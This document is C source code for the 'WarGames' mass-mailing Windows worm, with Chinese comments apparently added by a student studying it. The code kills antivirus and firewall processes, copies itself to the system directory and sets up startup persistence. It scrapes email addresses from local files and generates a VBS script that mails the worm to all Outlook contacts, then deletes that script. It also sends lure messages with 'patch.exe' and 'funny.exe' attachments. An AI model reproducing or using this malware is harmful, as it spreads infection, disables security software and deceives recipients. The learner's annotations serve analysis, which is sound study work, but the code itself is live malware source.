//***************************************************************************//
//恶意code...
//***************************************************************************//


#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#include <tlhelp32.h>
#pragma argused
#pragma inline

char 	filename[100], sysdir[100], copyr[50] = "w", winhtm[100], subj[50];
int	num, counter = 0;
char* alph[] = { "a","b","c","d","e","f","g","h","i","j","k","l","m",
		 "n","o","p","q","r","s","t","u","v","w","x","y","z" };
char	dn[20] = "Wargames Uninstall", ust[40] = "rundll32 mouse,disable";
LPSTR 	SHFolder = ".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
BYTE	desktop[50], favoris[50], personal[50], cache[50], page[150];
DWORD	sizcache = sizeof(desktop), sizfavoris = sizeof(favoris),
sizpersonal = sizeof(personal), sizdesktop = sizeof(cache), spage = sizeof(page);
DWORD	type = REG_SZ;
FILE* vbsworm, * winstart;
HANDLE	lSnapshot, myproc;
BOOL	rProcessFound;

LHANDLE session;
MapiMessage mess;
MapiMessage* mes;
MapiRecipDesc from;
char messId[512], mname[50], maddr[30];
HINSTANCE hMAPI;

WIN32_FIND_DATA		ffile;
PROCESSENTRY32 		uProcess;
HKEY			hReg;
SYSTEMTIME		wartime;

void StopAV(char*);
void FindFile(char*, char*);
void GetMail(char*, char*);
void sendmail(char*);

ULONG(PASCAL FAR* mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG(PASCAL FAR* mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG(PASCAL FAR* mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG(PASCAL FAR* mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG(PASCAL FAR* mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR*);
ULONG(PASCAL FAR* mFreeBuffer)(LPVOID);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
	// Kill Some AntiVirus
	StopAV("AVP32.EXE");		// AVP
	StopAV("AVPCC.EXE");		// AVP
	StopAV("AVPM.EXE");		// AVP
	StopAV("WFINDV32.EXE");		// Dr. Solomon
	StopAV("F-AGNT95.EXE");		// F-Secure
	StopAV("NAVAPW32.EXE");		// Norton Antivirus
	StopAV("NAVW32.EXE");		// Norton Antivirus
	StopAV("NMAIN.EXE");		// Norton Antivirus
	StopAV("PAVSCHED.EXE");		// Panda AntiVirus
	StopAV("ZONEALARM.EXE");	// ZoneAlarm

	// Kill Some Worm
	StopAV("KERN32.EXE");		// I-Worm.Badtrans
	StopAV("SETUP.EXE");		// I-Worm.Cholera
	StopAV("RUNDLLW32.EXE");	// I-Worm.Gift
	StopAV("GONER.SCR");		// I-Worm.Goner
	StopAV("LOAD.EXE");		// I-Worm.Nimda
	StopAV("INETD.EXE");		// I-Worm.Plage - BadTrans
	StopAV("FILES32.VXD");		// I-Worm.PrettyPark
	StopAV("SCAM32.EXE");		// I-Worm.Sircam
	StopAV("GDI32.EXE");		// I-Worm.Sonic
	StopAV("_SETUP.EXE");		// I-Worm.ZippedFiles
	StopAV("EXPLORE.EXE");		// I-Worm.ZippedFiles
	StopAV("ZIPPED_FILES.EXE");	// I-Worm.ZippedFiles
	//***************************************************************************//
	GetModuleFileName(hInst, filename, 100);//得到当前进程已经加载的模块名字，应该是call当前进程的exe的名字
	GetSystemDirectory((char*)sysdir, 100);//得到system目录完整的路径
	SetCurrentDirectory(sysdir);//切换当前进程的工作目录，这个就有问题吧，把当前进程的工作目录变成了系统目录。有问题啊，它要获取系统目录的权限干嘛？
	CopyFile(filename, "article.doc.exe", TRUE);//把当前进程的exe copy到系统目录下
	//***************************************************************************//
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\WarGames Worm", &hReg);//创建指定的注册表项，如果有，那么就打开它
	//HKEY_LOCAL_MACHINE：该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息
	// **********这是一种木马行为？能够造成潜在的开机自启动风险********** //
	//注册表是用来存储windows系统信息的，感觉就像给文件一个标识，它的结构和文件存储结构是一样的
	RegSetValueEx(hReg, "DisplayName", 0, REG_SZ, (BYTE*)dn, 20);
	/*
	第一个：打开的注册表的句柄
	第二个：要设置的值的名称
	第三个：要保留，为零
	第四个：注册表值的类型，REG_SZ表示用null结尾的字符串
	第五个：要设置的值的值，感觉第一个是键的名字，第五个是建指向的值
	最后一个是大小，键值的大小。
	*/
	RegSetValueEx(hReg, "UninstallString", 0, REG_SZ, (BYTE*)ust, 40);//说实话，我没看懂键值这是个啥，有什么用，为什么要有这个东西
	RegCloseKey(hReg);
	//总之就是这部分创建了个注册表或者说打开了个注册表，然后往里面设置了两个键
	randomize();//初始化随机数生成器，为了得到随机数。
	num = rand() % 10;
randname://个人感觉这里是一个worm复制的过程
	strcat(copyr, alph[GetTickCount() % 25]);
	if (++counter == num) {//如果恰好counter的大小和num相等
		strcat(copyr, ".exe");
		MessageBox(NULL, copyr, "New Copy Name:", MB_OK | MB_ICONINFORMATION);
		//***************************************************************************//
		CopyFile(filename, copyr, FALSE);//将现有文件复制给新文件，这段代码会恶意复制传播文件
		//***************************************************************************//

		WriteProfileString("WINDOWS", "RUN", copyr);
		/*Win.ini里面写东西，去"WINDOWS"这个节里面，找键"RUN"，然后把copyr这个写进去，这里应该是算把这个恶意复制的程序写到windows的配置文件中*/
		//
		// 产生疑惑，为什么复制一个文件还要去修改Win.ini？注册表有啥用？用于存储操作系统相关信息的，为啥worm恶意复制的时候要关注注册表？是要把程序信息写进去嘛？
		// 
		WritePrivateProfileString("rename", "NUL", filename, "WININIT.INI");
		/*将字符串filename复制到初始化文件WININIT.INI的指定节"rename"的"NUL"键中*/
		goto endrandname;
	}
	Sleep(GetTickCount() % 100);
	goto randname;
endrandname:

	hMAPI = LoadLibrary("MAPI32.DLL");
	(FARPROC&)mSendMail = GetProcAddress(hMAPI, "MAPISendMail");
	RegOpenKeyEx(HKEY_USERS, SHFolder, 0, KEY_QUERY_VALUE, &hReg);//打开SHFolder这个子键，句柄存在hReg里面
	//注册表是什么，键是什么，有什么用。
	RegQueryValueEx(hReg, "Desktop", 0, &type, desktop, &sizdesktop);//打开hReg注册表，寻找与Desktop有关联的以null结尾的unicode字符串，存到desktop中
	//下面的同理
	//但是这里的用处是啥？
	RegQueryValueEx(hReg, "Favorites", 0, &type, favoris, &sizfavoris);
	RegQueryValueEx(hReg, "Personal", 0, &type, personal, &sizpersonal);
	RegQueryValueEx(hReg, "Cache", 0, &type, cache, &sizcache);
	RegCloseKey(hReg);
	GetWindowsDirectory((char*)winhtm, 100);//检索windows目录的路径并且存到winhtm中


	//该模块功能是判断系统是否本地连接
	_asm
	{
		call	@wininet
		db	"WININET.DLL", 0
		@wininet:
		call	LoadLibrary
			test	eax, eax //判断是否成功LoadLibrary WININET.DLL
			//但是有个问题，LoadLibrary的传参有点小问题，他为啥是这样传参的？64位不应该是先rdx吗？奇怪了
			jz	end_asm
			mov	ebp, eax //把得到的dll的地址给ebp
			call	@inetconnect
			db	"InternetGetConnectedState", 0
			@inetconnect:
		push	ebp  //把dll的地址传入，InternetGetConnectedState 要从dll中导出的函数名
			call	GetProcAddress
			test	eax, eax
			jz	end_wininet
			mov	edi, eax //edi存的是InternetGetConnectedState这个导出的函数的地址
			verf : //InternetGetConnectedState检查本地系统是否连接

		//下面这个函数调用不知道用来干嘛
		push	0
			push	Tmp
			call	edi
			dec	eax //如果已经连接那么不跳转，结束该模块功能
			jnz	verf

			end_wininet :
		push	ebp
			call	FreeLibrary
			end_asm :
		jmp	end_all_asm

			Tmp	dd 0

			end_all_asm :
	}
	//去下面的那几个目录里面找文件，这部分有什么用
	FindFile(desktop, "*.htm");
	FindFile(desktop, "*.doc");
	FindFile(favoris, "*.ht*");
	FindFile(personal, "*.ht*");
	FindFile(personal, "*.doc");
	FindFile(personal, "*.xls");
	FindFile(personal, "*.asp");
	FindFile(cache, ".ht*");
	FindFile(cache, ".php");
	FindFile(cache, ".asp");
	FindFile(winhtm, ".ht*");
	FindFile(winhtm, ".doc");


	vbsworm = fopen("wargames.vbs", "w");
	fprintf(vbsworm, "On Error Resume Next\n");
	fprintf(vbsworm, "msgbox %cScripting.FileSystemObject%c\n", 34, 34);
	fprintf(vbsworm, "Set sf=CreateObject(%cScripting.FileSystemObject%c)\n", 34, 34);
	fprintf(vbsworm, "Set sys=sf.GetSpecialFolder(1)\n");
	fprintf(vbsworm, "Set OA=CreateObject(%cOutlook.Application%c)\n", 34, 34);
	fprintf(vbsworm, "Set MA=OA.GetNameSpace(%cMAPI%c)\n", 34, 34);
	fprintf(vbsworm, "For Each C In MA.AddressLists\n");
	fprintf(vbsworm, "If C.AddressEntries.Count <> 0 Then\n");
	fprintf(vbsworm, "For D=1 To C.AddressEntries.Count\n");
	fprintf(vbsworm, "Set AD=C.AddressEntries(D)\n");
	fprintf(vbsworm, "Set EM=OA.CreateItem(0)\n");
	fprintf(vbsworm, "EM.To=AD.Address\n");
	fprintf(vbsworm, "EM.Subject=%cHi %c&AD.Name&%c read this.%c\n", 34, 34, 34, 34);
	fprintf(vbsworm, "body=%cI found this on the web and it is important.%c\n", 34, 34);
	fprintf(vbsworm, "body = body & VbCrLf & %cOpen the attached file and read.%c\n", 34, 34);
	fprintf(vbsworm, "EM.Body=body\n");
	fprintf(vbsworm, "EM.Attachments.Add(sys&%c\\article.doc.exe%c)\n", 34, 34);
	fprintf(vbsworm, "EM.DeleteAfterSubmit=True\n");
	fprintf(vbsworm, "If EM.To <> %c%c Then\n", 34, 34);
	fprintf(vbsworm, "EM.Send\n");
	fprintf(vbsworm, "End If\n");
	fprintf(vbsworm, "Next\n");
	fprintf(vbsworm, "End If\n");
	fprintf(vbsworm, "Next\n");
	fclose(vbsworm);
	//***************************************************************************//
	ShellExecute(NULL, "open", "wargames.vbs", NULL, NULL, SW_SHOWNORMAL);//执行这个worm，wargame.vbs
	//***************************************************************************//
	Sleep(5000);
	DeleteFile("wargames.vbs");//执行完后删除这个文件，让受害电脑无法追踪

	(FARPROC&)mLogon = GetProcAddress(hMAPI, "MAPILogon");
	(FARPROC&)mLogoff = GetProcAddress(hMAPI, "MAPILogoff");
	(FARPROC&)mFindNext = GetProcAddress(hMAPI, "MAPIFindNext");
	(FARPROC&)mReadMail = GetProcAddress(hMAPI, "MAPIReadMail");
	(FARPROC&)mFreeBuffer = GetProcAddress(hMAPI, "MAPIFreeBuffer");
	mLogon(NULL, NULL, NULL, MAPI_NEW_SESSION, NULL, &session);//开启一个新的简单的MAPI对话，句柄存到session中
	if (mFindNext(session, 0, NULL, NULL, MAPI_LONG_MSGID, NULL, messId) == SUCCESS_SUCCESS) {
		do {
			if (mReadMail(session, NULL, messId, MAPI_ENVELOPE_ONLY | MAPI_PEEK, NULL, &mes) == SUCCESS_SUCCESS) {//读会话的邮件信息存到mes中
				strcpy(mname, mes->lpOriginator->lpszName);
				strcpy(maddr, mes->lpOriginator->lpszAddress);
				mes->ulReserved = 0;
				mes->lpszSubject = "Re: Fw:";
				mes->lpszNoteText = "I received your mail but I cannot reply immediatly.\n"
					"I send you a nice program. Look at this.\n\n"
					"	See you soon.";
				mes->lpszMessageType = NULL;
				mes->lpszDateReceived = NULL;
				mes->lpszConversationID = NULL;
				mes->flFlags = MAPI_SENT;
				mes->lpOriginator->ulReserved = 0;
				mes->lpOriginator->ulRecipClass = MAPI_ORIG;
				mes->lpOriginator->lpszName = mes->lpRecips->lpszName;
				mes->lpOriginator->lpszAddress = mes->lpRecips->lpszAddress;
				mes->nRecipCount = 1;
				mes->lpRecips->ulReserved = 0;
				mes->lpRecips->ulRecipClass = MAPI_TO;
				mes->lpRecips->lpszName = mname;
				mes->lpRecips->lpszAddress = maddr;
				mes->nFileCount = 1;
				mes->lpFiles = (MapiFileDesc*)malloc(sizeof(MapiFileDesc));
				memset(mes->lpFiles, 0, sizeof(MapiFileDesc));
				mes->lpFiles->ulReserved = 0;
				mes->lpFiles->flFlags = NULL;
				mes->lpFiles->nPosition = -1;
				mes->lpFiles->lpszPathName = filename;
				mes->lpFiles->lpszFileName = "funny.exe";
				mes->lpFiles->lpFileType = NULL;

				mSendMail(session, NULL, mes, NULL, NULL);//读到了之后改邮件信息然后回复信息

			}
		} while (mFindNext(session, 0, NULL, messId, MAPI_LONG_MSGID, NULL, messId) == SUCCESS_SUCCESS);
		free(mes->lpFiles);
		mFreeBuffer(mes);
		mLogoff(session, 0, 0, 0);
		FreeLibrary(hMAPI);
	}


}

void FindFile(char* folder, char* ext)
{
	register bool abc = TRUE;
	register HANDLE hFile;
	char mail[128];
	SetCurrentDirectory(folder);//设置当前目录，在被设置的当前目录下找指定文件
	hFile = FindFirstFile(ext, &ffile);//把第一个文件的信息存到ffile中
	if (hFile != INVALID_HANDLE_VALUE) {
		while (abc) {
			SetFileAttributes(ffile.cFileName, FILE_ATTRIBUTE_ARCHIVE);//给这个文件设置属性，设置成一个可存档的属性？
			GetMail(ffile.cFileName, mail);//第二个参数是out参数，得到该文件的相关信息
			if (strlen(mail) > 0) {
				//********************************************************************************//
				sendmail(mail);//把信息送给mail，目前不知道得到的信息是啥所以不知道邮件发到哪儿了
				//********************************************************************************//
			}
			abc = FindNextFile(hFile, &ffile);
		}
	}

}

void GetMail(char* namefile, char* mail)
{
	HANDLE	hf, hf2;
	char* mapped;
	DWORD	size, i, k;
	BOOL	test = FALSE, valid = FALSE;
	mail[0] = 0;

	hf = CreateFile(namefile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0);
	//打开namefile这个文件（如果存在），属性可读。不存在的话函数失败
	if (hf == INVALID_HANDLE_VALUE)
		return;
	size = GetFileSize(hf, NULL);
	if (!size)
		return;
	if (size < 8)
		return;
	size -= 100;

	hf2 = CreateFileMapping(hf, 0, PAGE_READONLY, 0, 0, 0);//创建仅可读的映射对象，应该是因为在磁盘中不可读，所以要映射到内存中
	if (!hf2) {
		CloseHandle(hf);
		return;
	}

	mapped = (char*)MapViewOfFile(hf2, FILE_MAP_READ, 0, 0, 0);//得到映射视图的地址
	if (!mapped) {
		CloseHandle(hf2);
		CloseHandle(hf);
		return;
	}
	//这部分到底想干什么？我没有看懂，给mail赋值，但是把哪些给mail？ 2023 12/8 14：53
	i = 0;
	while (i < size && !test) {
		if (!strncmpi("mailto:", mapped + i, strlen("mailto:"))) {
			test = TRUE;
			i += strlen("mailto:");
			k = 0;
			while (mapped[i] != 34 && mapped[i] != 39 && i < size && k < 127)
			{
				if (mapped[i] != ' ') 
				{
					mail[k] = mapped[i];
					k++;
					if (mapped[i] == '@')
						valid = TRUE;
				}
				i++;
			}
			mail[k] = 0;
		}
		else
			i++;//如果找到了i++？有点奇怪了
	}

	if (!valid)
		mail[0] = 0;
	UnmapViewOfFile(mapped);
	CloseHandle(hf2);
	CloseHandle(hf);
	return;
}

void sendmail(char* tos)//这个就是一个用来发送邮件的函数，传进去的tos是收件人的地址应该。
{
	memset(&mess, 0, sizeof(MapiMessage));//描述邮件
	memset(&from, 0, sizeof(MapiRecipDesc));//描述邮件收件人或发件人的相关信息
	wsprintf(subj, "Mail to %s.", tos);
	//把信息先写到subj中
	from.lpszName = NULL;
	from.ulRecipClass = MAPI_ORIG;//指示原始发件人
	mess.lpszSubject = subj;//描述邮件主题的字符串
	mess.lpszNoteText = "I send you this patch.\n"
		"It corrects a bug into Internet Explorer and Outlook.\n\n"
		"	Have a nice day. Best Regards.";//消息文本的字符串
	mess.lpRecips = (MapiRecipDesc*)malloc(sizeof(MapiRecipDesc));//包含相关邮件收件人的信息，这里指向的是原始发件人
	if (!mess.lpRecips)
		return;
	//下面这部分指定了邮件将发到哪儿去，显然有大问题
	//***********************************************************************************//
	memset(mess.lpRecips, 0, sizeof(MapiRecipDesc));
	mess.lpRecips->lpszName = tos;
	mess.lpRecips->lpszAddress = tos;//这个地址是否是有效地址？
	mess.lpRecips->ulRecipClass = MAPI_TO;
	mess.nRecipCount = 1;
	//***********************************************************************************//
	mess.lpFiles = (MapiFileDesc*)malloc(sizeof(MapiFileDesc));//这个用来存储邮件的附件信息，说明这个邮件附带了一个附件
	if (!mess.lpFiles)
		return;
	memset(mess.lpFiles, 0, sizeof(MapiFileDesc));
	mess.lpFiles->lpszPathName = filename;//附加文件的完全限定路径
	mess.lpFiles->lpszFileName = "patch.exe";//收件人看到的附加文件名称
	mess.nFileCount = 1;

	mess.lpOriginator = &from;//描述收件人的相关信息

	mSendMail(0, 0, &mess, 0, 0);
	//***********************************************************************************//
	free(mess.lpRecips);
	free(mess.lpFiles);
}

void StopAV(char* antivirus)//关闭进程，这个函数没有问题
{
	register BOOL term;
	lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //这是一个用来枚举进程的函数，得到当前系统的所有进程ID
	uProcess.dwSize = sizeof(uProcess);//这个如果不设置大小的花后面那个Process32First函数调用失败
	rProcessFound = Process32First(lSnapshot, &uProcess);
	//得到枚举进程中的第一个进程的信息
	while (rProcessFound) {
		if (strstr(uProcess.szExeFile, antivirus) != NULL) { //如果antivirus是这个进程相关联的exe，那么就去获取进程句柄
			myproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, uProcess.th32ProcessID);
			//打开现有的本地进程的对象打开成功就返回句柄，不成功就是null
			if (myproc != NULL) {
				term = TerminateProcess(myproc, 0);
				//关了它
			}
			CloseHandle(myproc);
		}
		rProcessFound = Process32Next(lSnapshot, &uProcess);//读枚举进程中下一个进程的信息。
	}
	CloseHandle(lSnapshot);
}